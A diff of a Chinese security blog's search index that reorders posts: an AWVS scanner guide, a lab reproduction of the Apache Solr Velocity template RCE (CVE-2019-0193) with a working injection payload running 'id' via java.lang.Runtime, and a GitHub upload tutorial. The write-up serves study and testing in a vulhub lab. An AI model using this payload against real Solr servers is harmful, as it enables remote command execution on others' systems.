@@ -1,105 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>AWVS的基本使用</title>
-    <url>/posts/22917.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。（下面用的是AWVS10.5）<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS2.png" alt></p>
-<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Site-Crawler"><a href="#Site-Crawler" class="headerlink" title="Site Crawler"></a>Site Crawler</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS3.png" alt></p>
-<p>点击Start对所输入的URL进行爬取，但是有的页面需要登录，不登录有些文件爬不到，就可以选择可以登录的login sequence进行登录（login sequence在处Application Settings处详细说明）,爬网结果可以保存下来，以便后续站点扫描使用。</p>
-<h2 id="Target-Finder"><a href="#Target-Finder" class="headerlink" title="Target Finder"></a>Target Finder</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS4.png" alt></p>
-<p>可以指定IP地址段进行端口扫描（类似于Nmap），可以用于信息收集。<br>进行了端口扫描后会进行服务发现，得到端口上对应的服务。</p>
-<h2 id="Subdomain-Scanner"><a href="#Subdomain-Scanner" class="headerlink" title="Subdomain Scanner"></a>Subdomain Scanner</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS5.png" alt></p>
-<p>用DNS进行域名解析，找域名下的子域及其主机名（用于信息收集） </p>
-<h2 id="Blind-SQL-Injector"><a href="#Blind-SQL-Injector" class="headerlink" title="Blind SQL Injector"></a>Blind SQL Injector</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS6.png" alt></p>
-<p>在相应参数位置按+添加注入点，让AWVS进行注入探测，可以dump有sql漏洞的数据库内容。</p>
-<h2 id="HTTP-Editor"><a href="#HTTP-Editor" class="headerlink" title="HTTP Editor"></a>HTTP Editor</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS7.png" alt><br>和BP repeater类似，可以进行手动漏洞挖掘探测。</p>
-<p><strong>Enocoder tool中可以进行各种加密解密</strong></p>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS8.png" alt></p>
-<h2 id="HTTP-Sniffer"><a href="#HTTP-Sniffer" class="headerlink" title="HTTP Sniffer"></a>HTTP Sniffer</h2><p>和BP proxy类似，首先要设置代理(Application Settings-&gt;HTTP Sniffer)，截取数据包，修改数据包提交或者丢弃。</p>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS9.png" alt></p>
-<p>手动设置代理<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS10.png" alt></p>
-<h2 id="HTTP-Fuzzer"><a href="#HTTP-Fuzzer" class="headerlink" title="HTTP Fuzzer"></a>HTTP Fuzzer</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS11.png" alt></p>
-<p>类似于BP intruder，进行暴力破解，点击+选择类型，点击insert插入 </p>
-<ul>
-<li>注意：插入字母的时候选取字母的范围填写的是字母对应的ASCII码。</li>
-</ul>
-<h2 id="Authentication-Tester"><a href="#Authentication-Tester" class="headerlink" title="Authentication Tester"></a>Authentication Tester</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS12.png" alt></p>
-<p>认证测试，用于尝试破解破解账户密码。 </p>
-<p>基于表单的认证方法要点击Select 选择表单的哪一部分是用户名，哪一部分是密码。</p>
-<h2 id="Compare-Results"><a href="#Compare-Results" class="headerlink" title="Compare Results"></a>Compare Results</h2><p>可以用不同用户登录后结果进行比较，和BP Compare类似。</p>
-<h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><h2 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS13.png" alt></p>
-<ul>
-<li>Client Certifications：有些Web Application需要客户端证书才能进行扫描。 </li>
-<li>Login Sequence Manger：类似于把登陆过程进行录像。AVWS站点扫描中可以选择login sequence、在Site Crawling处也可以选择login sequence</li>
-</ul>
-<h2 id="Scan-Settings"><a href="#Scan-Settings" class="headerlink" title="Scan Settings"></a>Scan Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS14.png" alt></p>
-<ul>
-<li>Google hacking database基于搜索引擎的信息收集：谷歌黑客数据库，但需要设置代理（LAN Settings）。</li>
-</ul>
-<h1 id="站点扫描"><a href="#站点扫描" class="headerlink" title="站点扫描"></a>站点扫描</h1><ul>
-<li>点击New Scan</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS15.png" alt></p>
-<ul>
-<li>点击扫描配置就是Scan Setting页面</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS16.png" alt></p>
-<ul>
-<li>发现目标服务器基本信息</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS17.png" alt></p>
-<ul>
-<li>是否需要登录，可以使用login sequence</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS18.png" alt></p>
-<ul>
-<li>finish，扫描结果可以保存为wvs文件，还能把结果制作成报表<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS19.png" alt></li>
-</ul>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Apache Solr Velocity Template RCE漏洞复现</title>
-    <url>/posts/57536.html</url>
-    <content><![CDATA[<h2 id="0x00-Apache-Solr介绍"><a href="#0x00-Apache-Solr介绍" class="headerlink" title="0x00 Apache Solr介绍"></a>0x00 Apache Solr介绍</h2><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p>
-<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。</p>
-<p>漏洞产生原因:</p>
-<p>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
-<h2 id="0x02-漏洞影响版本"><a href="#0x02-漏洞影响版本" class="headerlink" title="0x02 漏洞影响版本"></a>0x02 漏洞影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Solr 5.x -- 8.2.0，存在config API版本</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x03-漏洞环境搭建"><a href="#0x03-漏洞环境搭建" class="headerlink" title="0x03 漏洞环境搭建"></a>0x03 漏洞环境搭建</h2><p><strong>启动vulhub环境：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;solr&#x2F;CVE-2019-0193-RCE</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>创建一个名为test的Core:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure>
-<p>访问<a href="http://ip:8983，当前solr版本为8.1.1">http://ip:8983，当前solr版本为8.1.1</a><br>![](Apache Solr Velocity Template RCE漏洞复现/1.png)</p>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>漏洞利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击</p>
-<p>如下图所示，Core的名称为test</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;#&#x2F;~cores&#x2F;test</span><br></pre></td></tr></table></figure>
-<p>![](Apache Solr Velocity Template RCE漏洞复现/2.png)</p>
-<p>访问：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;test&#x2F;config</span><br></pre></td></tr></table></figure>
-<p>抓包修改GET请求为POST,POST内容如下（修改Core的配置）<br>![](Apache Solr Velocity Template RCE漏洞复现/3.png)<br>利用公开的EXP测试：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
-<p>![](Apache Solr Velocity Template RCE漏洞复现/4.png)</p>
-<p>查看ls<br>![](Apache Solr Velocity Template RCE漏洞复现/5.png)</p>
-<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193</a></p>
-<p><a href="https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py</a></p>
-<p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Active_Directory</title>
     <url>/posts/35642.html</url>
     <content><![CDATA[<h1 id="Active-Directory-活动目录"><a href="#Active-Directory-活动目录" class="headerlink" title="Active Directory(活动目录)"></a>Active Directory(活动目录)</h1><p><strong>Active Directory</strong>（简称AD。）是微软Windows Server中，负责架构中大型网路环境的集中式目录管理服务（Directory Services），在Windows 2000 Server开始内建于Windows Server产品中，它处理在组织中的网路物件，物件可以是使用者，群组，电脑，网域控制站，邮件，设定档，组织单元，树系等等，只要是在Active Directory结构定义档（schema）中定义的物件，就可以储存在Active Directory资料档中，并利用Active Directory Service Interface来存取。</p>
@@ -457,6 +358,110 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Apache Solr Velocity Template RCE漏洞复现</title>
+    <url>/posts/57536.html</url>
+    <content><![CDATA[<h2 id="0x00-Apache-Solr介绍"><a href="#0x00-Apache-Solr介绍" class="headerlink" title="0x00 Apache Solr介绍"></a>0x00 Apache Solr介绍</h2><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p>
+<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。</p>
+<p>漏洞产生原因:</p>
+<p>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
+<h2 id="0x02-漏洞影响版本"><a href="#0x02-漏洞影响版本" class="headerlink" title="0x02 漏洞影响版本"></a>0x02 漏洞影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Solr 5.x -- 8.2.0，存在config API版本</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-漏洞环境搭建"><a href="#0x03-漏洞环境搭建" class="headerlink" title="0x03 漏洞环境搭建"></a>0x03 漏洞环境搭建</h2><p><strong>启动vulhub环境：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;solr&#x2F;CVE-2019-0193-RCE</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>创建一个名为test的Core:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure>
+<p>访问<a href="http://ip:8983，当前solr版本为8.1.1">http://ip:8983，当前solr版本为8.1.1</a><br>![](Apache Solr Velocity Template RCE漏洞复现/1.png)</p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>漏洞利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击</p>
+<p>如下图所示，Core的名称为test</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;#&#x2F;~cores&#x2F;test</span><br></pre></td></tr></table></figure>
+<p>![](Apache Solr Velocity Template RCE漏洞复现/2.png)</p>
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;test&#x2F;config</span><br></pre></td></tr></table></figure>
+<p>抓包修改GET请求为POST,POST内容如下（修改Core的配置）<br>![](Apache Solr Velocity Template RCE漏洞复现/3.png)<br>利用公开的EXP测试：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
+<p>![](Apache Solr Velocity Template RCE漏洞复现/4.png)</p>
+<p>查看ls<br>![](Apache Solr Velocity Template RCE漏洞复现/5.png)</p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193</a></p>
+<p><a href="https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py</a></p>
+<p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AWVS的基本使用</title>
+    <url>/posts/22917.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。（下面用的是AWVS10.5）<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS2.png" alt></p>
+<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Site-Crawler"><a href="#Site-Crawler" class="headerlink" title="Site Crawler"></a>Site Crawler</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS3.png" alt></p>
+<p>点击Start对所输入的URL进行爬取，但是有的页面需要登录，不登录有些文件爬不到，就可以选择可以登录的login sequence进行登录（login sequence在处Application Settings处详细说明）,爬网结果可以保存下来，以便后续站点扫描使用。</p>
+<h2 id="Target-Finder"><a href="#Target-Finder" class="headerlink" title="Target Finder"></a>Target Finder</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS4.png" alt></p>
+<p>可以指定IP地址段进行端口扫描（类似于Nmap），可以用于信息收集。<br>进行了端口扫描后会进行服务发现，得到端口上对应的服务。</p>
+<h2 id="Subdomain-Scanner"><a href="#Subdomain-Scanner" class="headerlink" title="Subdomain Scanner"></a>Subdomain Scanner</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS5.png" alt></p>
+<p>用DNS进行域名解析，找域名下的子域及其主机名（用于信息收集） </p>
+<h2 id="Blind-SQL-Injector"><a href="#Blind-SQL-Injector" class="headerlink" title="Blind SQL Injector"></a>Blind SQL Injector</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS6.png" alt></p>
+<p>在相应参数位置按+添加注入点，让AWVS进行注入探测，可以dump有sql漏洞的数据库内容。</p>
+<h2 id="HTTP-Editor"><a href="#HTTP-Editor" class="headerlink" title="HTTP Editor"></a>HTTP Editor</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS7.png" alt><br>和BP repeater类似，可以进行手动漏洞挖掘探测。</p>
+<p><strong>Enocoder tool中可以进行各种加密解密</strong></p>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS8.png" alt></p>
+<h2 id="HTTP-Sniffer"><a href="#HTTP-Sniffer" class="headerlink" title="HTTP Sniffer"></a>HTTP Sniffer</h2><p>和BP proxy类似，首先要设置代理(Application Settings-&gt;HTTP Sniffer)，截取数据包，修改数据包提交或者丢弃。</p>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS9.png" alt></p>
+<p>手动设置代理<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS10.png" alt></p>
+<h2 id="HTTP-Fuzzer"><a href="#HTTP-Fuzzer" class="headerlink" title="HTTP Fuzzer"></a>HTTP Fuzzer</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS11.png" alt></p>
+<p>类似于BP intruder，进行暴力破解，点击+选择类型，点击insert插入 </p>
+<ul>
+<li>注意：插入字母的时候选取字母的范围填写的是字母对应的ASCII码。</li>
+</ul>
+<h2 id="Authentication-Tester"><a href="#Authentication-Tester" class="headerlink" title="Authentication Tester"></a>Authentication Tester</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS12.png" alt></p>
+<p>认证测试，用于尝试破解破解账户密码。 </p>
+<p>基于表单的认证方法要点击Select 选择表单的哪一部分是用户名，哪一部分是密码。</p>
+<h2 id="Compare-Results"><a href="#Compare-Results" class="headerlink" title="Compare Results"></a>Compare Results</h2><p>可以用不同用户登录后结果进行比较，和BP Compare类似。</p>
+<h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><h2 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS13.png" alt></p>
+<ul>
+<li>Client Certifications：有些Web Application需要客户端证书才能进行扫描。 </li>
+<li>Login Sequence Manger：类似于把登陆过程进行录像。AVWS站点扫描中可以选择login sequence、在Site Crawling处也可以选择login sequence</li>
+</ul>
+<h2 id="Scan-Settings"><a href="#Scan-Settings" class="headerlink" title="Scan Settings"></a>Scan Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS14.png" alt></p>
+<ul>
+<li>Google hacking database基于搜索引擎的信息收集：谷歌黑客数据库，但需要设置代理（LAN Settings）。</li>
+</ul>
+<h1 id="站点扫描"><a href="#站点扫描" class="headerlink" title="站点扫描"></a>站点扫描</h1><ul>
+<li>点击New Scan</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS15.png" alt></p>
+<ul>
+<li>点击扫描配置就是Scan Setting页面</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS16.png" alt></p>
+<ul>
+<li>发现目标服务器基本信息</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS17.png" alt></p>
+<ul>
+<li>是否需要登录，可以使用login sequence</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS18.png" alt></p>
+<ul>
+<li>finish，扫描结果可以保存为wvs文件，还能把结果制作成报表<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS19.png" alt></li>
+</ul>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cobalt Strike 4.0学习</title>
+    <url>/posts/7578.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>CVE-2019-0708本地复现</title>
     <url>/posts/16205.html</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2019-0708是微软于2019年5月14日发布的一个严重的RDP远程代码执行漏洞。该漏洞无需身份认证和用户交互，可能形成蠕虫爆发。该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。</p>
@@ -513,11 +518,6 @@
       <tags>
         <tag>漏洞复现</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Cobalt Strike 4.0学习</title>
-    <url>/posts/7578.html</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>DVWA之Command Injection</title>
@@ -648,6 +648,29 @@
       </tags>
   </entry>
   <entry>
+    <title>GitHub上传</title>
+    <url>/posts/8472.html</url>
+    <content><![CDATA[<h2 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h2><hr>
+<p>0x00.首先注册github账号，登录，创建新仓库 ，点击+，点击new repository   <img src="https://i.imgur.com/Q2p1noE.png" alt>    </p>
+<p>进入如下页面，填写仓库名，自己随便写一个名字，下面的描述可写可不写，点击Initialize this repository   with a README，然后创建：<a id="more"></a><br><img src="https://i.imgur.com/wNvnT5T.png" alt>   </p>
+<p>0x01.下载git<br><a href="https://gitforwindows.org/" target="_blank" rel="noopener">https://gitforwindows.org/</a> </p>
+<p>0x02.配置git<br>1.设置本地的ssh key，打开git bash,输入命令：<br>ssh-keygen -t rsa -C “<a href="mailto:XXXXXX@XXXX.com">XXXXXX@XXXX.com</a>“<br>其中双引号中是你注册github时用的邮箱。<br>一直回车，选择默认路径，和空密码。最后会在默认路径下生成.ssh文件夹，打开.ssh里面有两个文件，打开id_rsa.pub复制里面的密钥。</p>
+<p>2.打开github,选择settings<br><img src="https://i.imgur.com/jqqfV4E.png" alt><br>得到如下页面，点击ssh and gpg keys,选择ssh keys 右边的new ssh key。出现下面绿色框的内容，填写标题，并将自己刚才复制的密钥粘贴到key中。最后点击add ssh key.<br><img src="https://i.imgur.com/PWqO1em.png" alt><br>3.查看是否成功。</p>
+<p>在git bash中输入命令：ssh -T <a href="mailto:git@github.com">git@github.com</a><br>会提示，是否continue，输入yes。<br>后就会看到：</p>
+<p>Warning:Permanently added ‘github.com,207.97.227.239’ (RSA) to the list of known hosts.</p>
+<p>Hi zhangsiyao11! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
+<p>这样就成功了，不用理会warning。</p>
+<p>4.克隆你刚才新建的仓库到本地<br>输入命令：<br>git clone <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>后面的http是你的仓库的地址。<br>此时会在刚才创建ssh  key的默认目录下生成以你仓库名为文件名的文件，打开得到下图所示：<br><img src="https://i.imgur.com/0oHqKNs.png" alt></p>
+<p>6.在此处右键打开git bash,输入如下命令：<br>git init<br>git add “文件名”<br>git commit -m “文件名”<br>如果出现让你设置用户名和用户邮箱的提示，就按照提示上给的命令输入即可。后再次执行上面commit的命令。<br>git remote add origin <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>http为你自己仓库的地址<br>如果出现错误：<br>fatal: remote origin already exists<br>则执行以下语句：git remote rm origin<br>再执行git remote add origin <a href="https://github.com/zhangsiyao11/chat即可。" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat即可。</a><br>最后在依次执行：<br>git pull origin master<br>git push origin master<br>完成，再打开自己的仓库就会出现刚刚上传的项目文件:<br><img src="https://i.imgur.com/X0sb9Hw.png" alt></p>
+]]></content>
+      <categories>
+        <category>Github</category>
+      </categories>
+      <tags>
+        <tag>Github</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Git学习（一）</title>
     <url>/posts/55269.html</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Git是目前世界上最先进的分布式版本控制系统（没有之一）。</p>
@@ -695,29 +718,6 @@
       </categories>
       <tags>
         <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GitHub上传</title>
-    <url>/posts/8472.html</url>
-    <content><![CDATA[<h2 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h2><hr>
-<p>0x00.首先注册github账号，登录，创建新仓库 ，点击+，点击new repository   <img src="https://i.imgur.com/Q2p1noE.png" alt>    </p>
-<p>进入如下页面，填写仓库名，自己随便写一个名字，下面的描述可写可不写，点击Initialize this repository   with a README，然后创建：<a id="more"></a><br><img src="https://i.imgur.com/wNvnT5T.png" alt>   </p>
-<p>0x01.下载git<br><a href="https://gitforwindows.org/" target="_blank" rel="noopener">https://gitforwindows.org/</a> </p>
-<p>0x02.配置git<br>1.设置本地的ssh key，打开git bash,输入命令：<br>ssh-keygen -t rsa -C “<a href="mailto:XXXXXX@XXXX.com">XXXXXX@XXXX.com</a>“<br>其中双引号中是你注册github时用的邮箱。<br>一直回车，选择默认路径，和空密码。最后会在默认路径下生成.ssh文件夹，打开.ssh里面有两个文件，打开id_rsa.pub复制里面的密钥。</p>
-<p>2.打开github,选择settings<br><img src="https://i.imgur.com/jqqfV4E.png" alt><br>得到如下页面，点击ssh and gpg keys,选择ssh keys 右边的new ssh key。出现下面绿色框的内容，填写标题，并将自己刚才复制的密钥粘贴到key中。最后点击add ssh key.<br><img src="https://i.imgur.com/PWqO1em.png" alt><br>3.查看是否成功。</p>
-<p>在git bash中输入命令：ssh -T <a href="mailto:git@github.com">git@github.com</a><br>会提示，是否continue，输入yes。<br>后就会看到：</p>
-<p>Warning:Permanently added ‘github.com,207.97.227.239’ (RSA) to the list of known hosts.</p>
-<p>Hi zhangsiyao11! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
-<p>这样就成功了，不用理会warning。</p>
-<p>4.克隆你刚才新建的仓库到本地<br>输入命令：<br>git clone <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>后面的http是你的仓库的地址。<br>此时会在刚才创建ssh  key的默认目录下生成以你仓库名为文件名的文件，打开得到下图所示：<br><img src="https://i.imgur.com/0oHqKNs.png" alt></p>
